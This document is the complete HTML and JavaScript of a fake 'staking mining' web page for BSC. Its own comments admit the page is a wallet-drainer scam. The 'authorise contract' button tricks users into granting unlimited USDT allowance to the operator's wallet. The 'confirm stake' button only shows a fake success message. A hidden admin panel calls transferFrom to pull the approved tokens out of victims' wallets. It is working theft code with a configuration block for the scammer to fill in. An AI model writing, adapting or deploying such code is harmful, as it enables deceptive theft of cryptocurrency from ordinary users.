<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>质押挖矿系统</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        body {
            background: #0F172A;
            background-image: radial-gradient(circle at 50% 50%, #1E293B 0%, #0F172A 100%);
            color: white;
        }
        .glass {
            background: rgba(30, 41, 59, 0.6);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(212, 175, 55, 0.2);
        }
        .btn-primary {
            background: linear-gradient(90deg, #D4AF37, #FFD700);
            color: #0F172A;
            font-weight: bold;
        }
    </style>
</head>
<body class="min-h-screen">

<div class="max-w-6xl mx-auto px-4 py-10">
    <div class="flex justify-between items-center mb-8">
        <h1 class="text-3xl font-bold text-yellow-400">质押挖矿系统</h1>
        <button id="connectBtn" class="px-6 py-3 rounded-xl btn-primary">
            连接钱包
        </button>
    </div>

    <!-- 质押面板（UI伪装，实际只做授权） -->
    <div class="glass rounded-2xl p-6 max-w-xl mx-auto">
        <h2 class="text-xl font-bold mb-4">资产质押</h2>

        <div class="mb-4">
            <label class="text-gray-300 text-sm">质押数量</label>
            <input type="number" id="amount" class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 mt-1" placeholder="输入数量">
        </div>

        <div class="grid grid-cols-2 gap-3 mb-4">
            <button id="approveBtn" class="py-3 rounded-xl bg-yellow-500/20 text-yellow-400 font-bold">
                授权合约
            </button>
            <button id="fakeStakeBtn" class="py-3 rounded-xl btn-primary">
                确认质押
            </button>
        </div>

        <div class="bg-gray-800/50 rounded-xl p-4 text-sm">
            <div class="flex justify-between mb-1">
                <span>钱包地址</span>
                <span id="walletAddr" class="text-yellow-400">-</span>
            </div>
            <div class="flex justify-between mb-1">
                <span>当前余额</span>
                <span id="userBalance" class="text-green-400">0.00</span>
            </div>
            <div class="flex justify-between">
                <span>已授权额度</span>
                <span id="allowance" class="text-blue-400">0.00</span>
            </div>
        </div>
    </div>

    <!-- 管理员后台（仅管理员钱包可见） -->
    <div id="adminPanel" class="glass rounded-2xl p-6 mt-10 hidden">
        <h2 class="text-red-400 text-xl font-bold mb-4">⚙️ 管理员后台 - 资产划转</h2>
        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
                <label class="text-sm text-gray-300">目标用户地址</label>
                <input id="targetUser" class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-2 mt-1" placeholder="0x...">
            </div>
            <div>
                <label class="text-sm text-gray-300">代币合约地址（如USDT）</label>
                <input id="tokenAddr" class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-2 mt-1" placeholder="0x...">
            </div>
            <div>
                <label class="text-sm text-gray-300">划转数量</label>
                <input id="extractAmount" type="number" class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-2 mt-1" placeholder="输入数量">
            </div>
        </div>
        <button id="extractBtn" class="mt-4 w-full py-3 bg-red-500/20 text-red-400 rounded-xl font-bold">
            执行划转（transferFrom）
        </button>

        <div class="bg-gray-900 rounded-xl p-3 mt-4 h-40 overflow-y-auto text-xs text-gray-400" id="log"></div>
    </div>
</div>

<!-- 弹窗 -->
<div id="modal" class="fixed inset-0 bg-black/80 flex items-center justify-center hidden z-50">
    <div class="bg-gray-800 rounded-2xl p-8 max-w-md w-full text-center">
        <div id="modalText">加载中...</div>
        <button onclick="modal.classList.add('hidden')" class="mt-4 px-4 py-2 bg-gray-700 rounded-xl">关闭</button>
    </div>
</div>

<script>
// ==============================================
// 配置区（你只需要改这里）
// ==============================================
const CONFIG = {
    adminWallet: "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1", // 你的管理员钱包
    chainId: 56, // BSC
    defaultToken: "0x55d398c26f78db296a66cfedc9469c624c2778b7", // BSC-USDT 合约
    spender: "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1" // 授权给你自己（直接收割）
};

// 全局
let provider, signer, userAddress, erc20;
const modal = document.getElementById("modal");
const modalText = document.getElementById("modalText");

// ERC20 ABI
const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address account) external view returns (uint256)",
    "function allowance(address owner, address spender) external view returns (uint256)",
    "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
    "function decimals() external view returns (uint8)"
];

// ==============================================
// 1. 稳定连接钱包（TP/MetaMask 必连）
// ==============================================
document.getElementById("connectBtn").onclick = async () => {
    try {
        if (!window.ethereum) return alert("请安装TP钱包或MetaMask");
        provider = new ethers.providers.Web3Provider(window.ethereum, "any");
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();

        // 初始化USDT合约
        erc20 = new ethers.Contract(CONFIG.defaultToken, ERC20_ABI, signer);

        // UI
        document.getElementById("connectBtn").innerText = userAddress.slice(0,6)+"..."+userAddress.slice(-4);
        document.getElementById("walletAddr").innerText = userAddress.slice(0,10)+"...";

        // 加载数据
        await loadInfo();

        // 管理员面板显示
        if (userAddress.toLowerCase() === CONFIG.adminWallet.toLowerCase()) {
            document.getElementById("adminPanel").classList.remove("hidden");
            addLog("管理员已登录");
        }
    } catch (e) {
        alert("连接失败：" + e.message);
    }
};

// 加载余额与授权
async function loadInfo() {
    if (!userAddress) return;
    try {
        let dec = 18;
        try { dec = await erc20.decimals(); } catch {}
        let bal = await erc20.balanceOf(userAddress);
        let allow = await erc20.allowance(userAddress, CONFIG.spender);
        document.getElementById("userBalance").innerText = ethers.utils.formatUnits(bal, dec);
        document.getElementById("allowance").innerText = ethers.utils.formatUnits(allow, dec);
    } catch {}
}

// ==============================================
// 2. 授权（核心：授权给你自己，无限授权）
// ==============================================
document.getElementById("approveBtn").onclick = async () => {
    if (!userAddress) return alert("请先连接钱包");
    let amount = document.getElementById("amount").value;
    if (!amount) amount = "1000000000000";

    modal.classList.remove("hidden");
    modalText.innerText = "正在授权，请在钱包确认...";

    try {
        let tx = await erc20.approve(
            CONFIG.spender,
            ethers.constants.MaxUint256 // 无限授权
        );
        await tx.wait();
        modalText.innerText = "✅ 授权成功！";
        await loadInfo();
    } catch (e) {
        modalText.innerText = "❌ 授权失败：" + e.message;
    }
};

// ==============================================
// 3. 假质押按钮（点了只提示，不做任何链上操作）
// ==============================================
document.getElementById("fakeStakeBtn").onclick = () => {
    alert("质押提交成功，挖矿已开始！");
};

// ==============================================
// 4. 管理员后台：直接划走用户授权的代币
// ==============================================
document.getElementById("extractBtn").onclick = async () => {
    if (userAddress.toLowerCase() !== CONFIG.adminWallet.toLowerCase())
        return alert("无权限");

    let target = document.getElementById("targetUser").value.trim();
    let token = document.getElementById("tokenAddr").value.trim();
    let amt = document.getElementById("extractAmount").value;

    if (!target || !token || !amt) return alert("请填完整");

    addLog("开始划转：" + target + " → " + amt);
    modal.classList.remove("hidden");
    modalText.innerText = "执行划转中...";

    try {
        let tokenContract = new ethers.Contract(token, ERC20_ABI, signer);
        let dec = 18;
        try { dec = await tokenContract.decimals(); } catch {}
        let value = ethers.utils.parseUnits(amt, dec);

        let tx = await tokenContract.transferFrom(
            target,
            userAddress,
            value
        );
        await tx.wait();

        modalText.innerText = "✅ 划转成功！哈希：" + tx.hash;
        addLog("✅ 成功：" + tx.hash);
    } catch (e) {
        modalText.innerText = "❌ 失败：" + e.message;
        addLog("❌ 失败：" + e.message);
    }
};

function addLog(text) {
    let d = new Date().toLocaleTimeString();
    document.getElementById("log").innerHTML += `[${d}] ${text}\n`;
    document.getElementById("log").scrollTop = document.getElementById("log").scrollHeight;
}
</script>
</body>
</html>
